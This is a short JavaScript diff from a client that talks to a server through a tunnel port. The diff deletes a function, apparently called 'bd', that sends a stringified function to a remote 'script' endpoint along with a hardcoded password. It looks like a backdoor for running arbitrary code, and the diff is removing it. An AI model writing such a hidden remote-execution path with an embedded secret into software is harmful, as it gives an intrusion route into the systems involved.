@@ -21,9 +21,3 @@ let $get = ( url, c )=>{
 let mongo = ( q,c ) => {
     $get('https://'+server.ip+':'+server.ports.tunnel+'/'+q, d=>c(d));
 };
-
-let bd = ( s,p ) => {
-    let f = s.toString();
-    p = '&p='+'c0w7788A'; 
-    mongo('script?s='+f+p, d=>console.log(d));
-};
